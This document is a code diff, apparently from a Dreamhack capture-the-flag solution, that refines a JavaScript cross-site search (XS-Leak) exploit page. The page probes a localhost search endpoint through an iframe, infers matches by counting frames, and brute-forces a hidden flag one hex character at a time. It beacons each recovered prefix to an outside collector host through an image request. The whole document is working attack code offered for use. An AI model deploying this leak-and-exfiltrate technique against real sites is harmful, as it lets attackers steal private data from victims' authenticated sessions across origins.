@@ -1,20 +1,28 @@
 <iframe id="iframe"></iframe>
 <img id="img" />
+
 <script>
   async function req(url) {
     return await new Promise((resolve, reject) => {
       const iframe = document.getElementById("iframe");
+
       iframe.src = url;
+
       iframe.onload = () => {
-        if (iframe.contentWindow.frames.length != 0) return resolve();
-        else return reject();
+        if (iframe.contentWindow.frames.length != 0) {
+          return resolve();
+        } else {
+          return reject();
+        }
       };
     });
   }
 
   async function search(query) {
     try {
-      await req(`http://localhost:8000/search?query=${query}`);
+      await req(
+        `http://localhost:8000/search?query=${encodeURIComponent(query)}`,
+      );
       return true;
     } catch (e) {
       return false;
@@ -22,18 +30,41 @@
   }
 
   async function exploit() {
-    let chars = "0123456789abcdef}";
+    const chars = "0123456789abcdef";
     let secret = "DH{";
 
-    while (!secret.includes("}")) {
-      for (let c of chars) {
+    // DH{ 뒤의 16진수 32글자 추출
+    while (secret.length < 35) {
+      let found = false;
+
+      for (const c of chars) {
         if (await search(secret + c)) {
           secret += c;
-          img.src = `https://qqmmirq.request.dreamhack.games/${secret}`;
+          found = true;
+
+          img.src =
+            `https://qqmmirq.request.dreamhack.games/` +
+            encodeURIComponent(secret);
+
           break;
         }
       }
+
+      // 일치하는 문자가 없을 경우 무한 반복 방지
+      if (!found) {
+        img.src =
+          `https://qqmmirq.request.dreamhack.games/error/` +
+          encodeURIComponent(secret);
+        return;
+      }
     }
+
+    // DH{[0-9a-f]{32}} 완성
+    secret += "}";
+
+    img.src =
+      `https://qqmmirq.request.dreamhack.games/complete/` +
+      encodeURIComponent(secret);
   }
 
   exploit();
